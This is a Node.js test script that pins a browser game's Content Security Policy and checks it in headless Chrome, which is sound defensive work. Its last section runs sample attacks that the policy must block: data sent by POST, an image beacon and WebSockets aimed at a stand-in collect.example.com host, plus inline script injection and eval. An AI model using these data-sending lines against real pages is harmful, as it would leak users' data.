#!/usr/bin/env node
// Checks the page's content security policy (what it is for: SECURITY.md, point 7): first the policy as written,
// pinned whole, then in headless Chrome (tools/browser.js) the page starting and playing with nothing refused, and
// what the policy must refuse refused. That the real PeerJS file, broker and relays work under it is shown by an
// online round on the PR's preview, not here (no network in a suite).
//
//   node tools/csp-test.js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { launch, serve, reporter } = require('./browser');
const root = path.join(__dirname, '..');
const report = reporter(), { check } = report;

const html = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
const PEERJS = fs.readFileSync(path.join(root, 'net.js'), 'utf8').match(/const PEERJS = '([^']+)'/)[1];
const BROKER = ['https://0.peerjs.com', 'wss://0.peerjs.com']; // (PeerJS's own broker: net.js names no other host)
const RELAYS = JSON.parse(fs.readFileSync(path.join(root, 'net-relays.js'), 'utf8').match(/const RELAYS = (\[[^\]]+\])/)[1].replace(/'/g, '"')); // (net-relays.js's)

// The policy as written.
const metas = [...html.matchAll(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/gi)];
check(metas.length === 1, 'index.html has one content security policy', `${metas.length} found`);
const at = metas[0]?.index ?? Infinity;
const first = html.search(/<script|<link rel="stylesheet"|<style/);
check(at < first, 'it comes before every script and stylesheet (a policy governs only what follows it)');
const policy = Object.fromEntries((metas[0]?.[1] || '').split(';').map(d => d.trim().split(/\s+/)).filter(d => d[0]).map(([k, ...v]) => [k, v]));
const same = (a = [], b) => a.length === b.length && b.every(x => a.includes(x));
const inline = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>([\s\S]*?)<\/script\s*>/gi)].map(m => `'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`);
// The whole policy, each directive with exactly these sources: one added, dropped or widened fails here, so the
// change is made on purpose, in this file too, and its PR says why.
const PINNED = {
  'default-src': ["'none'"],                     // (whatever it doesn't name is refused)
  'script-src': ["'self'", PEERJS, ...inline],   // (PeerJS's exact file, as net.js loads it; the inline scripts by hash)
  'connect-src': ["'self'", ...BROKER, ...RELAYS], // (each relay one exact wss: host, never a wildcard)
  'style-src': ["'self'", "'unsafe-inline'"],    // (the markup's style attributes)
  'font-src': ["'self'"],
  'img-src': ["'self'", 'data:'],                // (the HUD's data: dots)
  'child-src': ["'self'", 'blob:'],              // (the service worker and keepTimeWhileHidden's blob: worker in game/core.js)
  'frame-src': ["'none'"],                       // (no frames, though child-src would let some in)
  'base-uri': ["'none'"],
  'form-action': ["'none'"],
};
for (const [k, want] of Object.entries(PINNED)) {
  const got = policy[k];
  check(same(got, want), `${k} is ${k === 'script-src' ? "'self', PeerJS's file and the inline scripts' hashes" : want.join(' ')}`,
    same(got, want) ? '' : `it has ${got ? got.join(' ') : 'none'}${k === 'script-src' ? `; the inline scripts' hashes: ${inline.join(' ')}` : ''}`);
}
const extra = Object.keys(policy).filter(k => !(k in PINNED));
check(!extra.length, 'no other directive (one such as script-src-elem would override these)', extra.join(', '));
check(!/<[a-z][^>]*\son[a-z]+=/i.test(html), 'no inline event handler in index.html (the policy refuses them)');
const loaded = [...html.matchAll(/<script src="([^"]+)"/g)].map(m => m[1]);
const building = loaded.filter(f => /\beval\(|new Function\b|set(Timeout|Interval)\(\s*['"`]/.test(fs.readFileSync(path.join(root, f), 'utf8')));
check(!building.length, 'no script the page loads builds code from text (SECURITY.md, point 6; the policy refuses it)', building.join(', '));

// In the browser: every refusal the page meets is counted.
const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation', e => __refused.push(e.effectiveDirective + ' ' + e.blockedURI));`;
(async () => {
  const site = await serve();
  const b = await launch();
  const { ev } = b;
  try {
    await b.send('Page.addScriptToEvaluateOnNewDocument', { source: WATCH });
    await b.viewport(1000, 800);
    // Requests to PeerJS's file and broker are answered here as failed, never sent: what's checked is only that the
    // policy lets them out of the page.
    const asked = [];
    await b.send('Fetch.enable', { patterns: [{ urlPattern: 'https://cdnjs.cloudflare.com/*' }, { urlPattern: 'https://0.peerjs.com/*' }] });
    b.on('Fetch.requestPaused', p => { asked.push(p.request.url); b.send('Fetch.failRequest', { requestId: p.requestId, errorReason: 'InternetDisconnected' }).catch(() => {}); });

    await b.go(site.url + '?debug', { settle: 600 });
    check(await ev(`window.snakeBrowserOk === true && !/newer browser/.test(document.getElementById('overlay-title').textContent)`),
      'the page takes this browser as new enough (its check runs under the policy)');
    check(await ev(`Promise.race([navigator.serviceWorker.ready.then(() => true), new Promise(r => setTimeout(r, 5000, false))])`), 'the service worker starts');
    await ev(`document.getElementById('watch').click(), SnakeDebug.frames(80), 'ok'`);
    check(await ev(`document.fonts.ready.then(() => [...document.fonts].some(f => f.family.replace(/"/g, '') === 'Fredoka' && f.status === 'loaded'))`),
      'the lettering, Fredoka, loads from this site');
    check(await ev(`SnakeDebug.state() === 'running' && SnakeDebug.game().tick > 0`), 'a round plays');
    check(await ev(`keepTimeWhileHidden(true), !!hiddenClock`), "a hidden host's clock starts (a blob: worker)");
    await ev(`new Promise(r => { hiddenClock.onmessage = () => r(); setTimeout(r, 1000); }).then(() => keepTimeWhileHidden(false))`);
    check(await ev(`JSON.stringify(__refused)`) === '[]', 'nothing the page does is refused', await ev(`__refused.join('; ')`));

    // What the policy lets out: PeerJS's pinned file, and its broker.
    const { result: page } = await b.send('Runtime.evaluate', { expression: 'globalThis' }); // (PEERJS goes in as a value, never as code)
    await b.send('Runtime.callFunctionOn', { objectId: page.objectId, arguments: [{ value: PEERJS }],
      functionDeclaration: `function (src) { const s = document.createElement('script'); s.src = src; document.head.append(s); fetch('https://0.peerjs.com/peerjs/id').catch(() => {}); }` });
    await b.sleep(500);
    check(asked.includes(PEERJS) && asked.some(u => u.startsWith('https://0.peerjs.com/')), "PeerJS's file and broker are let through", asked.join(', '));
    await ev(`(() => { const w = new WebSocket('wss://0.peerjs.com/peerjs'); w.onerror = () => {}; setTimeout(() => w.close(), 100); return 'ok'; })()`);
    await b.sleep(300); // (a refusal comes after the call that opens the socket, never during it)
    check(await ev(`__refused.length === 0`), "PeerJS's broker's socket is let through", await ev(`__refused.join('; ')`));
    await b.send('Runtime.callFunctionOn', { objectId: page.objectId, arguments: [{ value: RELAYS }],
      functionDeclaration: `function (urls) { for (const u of urls) { const w = new WebSocket(u); w.onerror = () => {}; setTimeout(() => w.close(), 100); } }` });
    await b.sleep(300);
    check(await ev(`__refused.length === 0`), `the relays' sockets are let through (${RELAYS.length})`, await ev(`__refused.join('; ')`));

    // What it refuses.
    const refused = async (what, js, directive) => {
      await ev(`__refused.length = 0, 'ok'`);
      const ran = await ev(js);
      await b.sleep(200);
      const got = await ev(`__refused.join('; ')`);
      check(!ran && got.includes(directive), `refused: ${what}`, `ran: ${ran}; refused: ${got || 'nothing'}`);
    };
    await refused('an inline script added to the page', `(() => { const s = document.createElement('script'); s.textContent = 'window.__ran = 1'; document.head.append(s); return !!window.__ran; })()`, 'script-src');
    await refused('code built from text', `new Promise(r => setTimeout(() => { try { eval('1'); r(true); } catch { r(false); } }))`, 'script-src');
    await refused('a script from another site', `new Promise(r => { const s = document.createElement('script'); s.src = 'https://cdn.example.com/x.js'; s.onload = () => r(true); s.onerror = () => r(false); document.head.append(s); })`, 'script-src');
    await refused('another of PeerJS\'s versions from the same site', `new Promise(r => { const s = document.createElement('script'); s.src = 'https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.4/peerjs.min.js'; s.onload = () => r(true); s.onerror = () => r(false); document.head.append(s); })`, 'script-src');
    await refused('sending to another site', `fetch('https://collect.example.com/?d=1', { method: 'POST', body: 'x' }).then(() => true, () => false)`, 'connect-src');
    await refused('a socket to another site', `(() => { try { new WebSocket('wss://collect.example.com/'); } catch {} return false; })()`, 'connect-src');
    await refused('a socket to a relay net-relays.js doesn\'t name', `(() => { try { new WebSocket('wss://relay.example.com/'); } catch {} return false; })()`, 'connect-src');
    await refused('a stylesheet from another site', `new Promise(r => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://fonts.example.com/x.css'; l.onload = () => r(true); l.onerror = () => r(false); document.head.append(l); })`, 'style-src');
    await refused('a frame, even of this site', `(() => { const f = document.createElement('iframe'); f.src = location.href; document.body.append(f); setTimeout(() => f.remove(), 150); return false; })()`, 'frame-src');
    await refused('an image from another site (a way to send)', `new Promise(r => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'https://collect.example.com/p.gif?d=1'; })`, 'img-src');
  } finally {
    await b.close();
    site.close();
  }
  report.end(b);
})().catch(e => { console.error(e); process.exit(1); });
